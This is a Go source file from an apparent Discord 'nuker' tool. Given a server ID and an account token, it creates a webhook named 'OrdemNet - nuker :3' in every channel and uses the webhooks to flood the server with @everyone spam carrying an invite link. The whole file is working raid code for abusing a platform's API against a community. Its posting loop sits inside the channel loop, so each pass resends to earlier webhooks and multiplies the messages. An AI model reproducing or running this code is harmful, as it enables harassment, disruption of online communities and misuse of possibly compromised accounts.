package cmds

import (
	"fmt"
	"github.com/go-resty/resty/v2"
	"time"
)

type Channell struct {
	Id string `json:"id"`
}

type WebhookRes struct {
	Wid string `json:"id"`
	Tkn string `json:"token"`
}

func Evr(Serverid int, Token string) {
	client := resty.New()
	chns := []Channell{}

	url := fmt.Sprintf("https://discord.com/api/v9/guilds/%d/channels", Serverid)

	
	resp, err := client.R().
	SetHeader("Authorization", Token).
	SetResult(&chns).
	Get(url)		

	if err != nil || resp == nil {
		fmt.Println("\033[33m[!]\033[0m | erro na requisição. | > ", err)
	}

	if err != nil || resp == nil {
		fmt.Println("\033[33m[-]\033[0m erro: ", err)
		fmt.Scanln()
		time.Sleep(1)
	}

	fmt.Println("[/] A pegar canais.")
	time.Sleep(2)


	var webhooks []WebhookRes

	for _, chn := range chns {
		var webhook WebhookRes
		cwurl := fmt.Sprintf("https://discord.com/api/v10/channels/%s/webhooks", chn.Id)
		resp, err := client.R().
			SetHeader("Authorization", Token).
			SetHeader("Content-Type", "application/json").
			SetBody(map[string]interface{}{
				"name": "OrdemNet - nuker :3",
			}).
			SetResult(&webhook).
			Post(cwurl)
			
				
		if err != nil || resp == nil {
			fmt.Println("\033[33m[-]\033[0m erro: ", err)
			fmt.Scanln()
			time.Sleep(1)
			continue
		}

		webhooks = append(webhooks, webhook)

		status := resp.StatusCode()

		switch status {
		case 200:
			fmt.Println("\033[33m[+]\033[0m webhook criada com sucesso > ", status)
		case 204:
			fmt.Println("\033[33m[+]\033[0m webhook criada com sucesso", status)
		case 202:
			fmt.Println("\033[33m[+]\033[0m webhook criada com sucesso", status)
		case 401:
			fmt.Println("\033[33m[-]\033[0m token nao esta valido")
		case 403:
			fmt.Println("\033[33m[-]\033[0m sem permissao para criar webhook")
		case 429:
			fmt.Println("\033[33m[-]\033[0m limite de requests excedido")
		}

		for _, wbh := range webhooks {
			webhookURL := fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", wbh.Wid, wbh.Tkn)
			res, err := client.R().
				SetHeader("Authorization", Token).
				SetHeader("Content-Type", "application/json").
				SetBody(map[string]string{
					"content": "`<3` pooped by montey lol https://discord.gg/BxGNt5HA94 @everyone",
				}).
				Post(webhookURL)

			if err != nil || res == nil {
				fmt.Println("\033[33m[-]\033[0m erro: ", err)
				time.Sleep(1)
			}
		}
	}
}
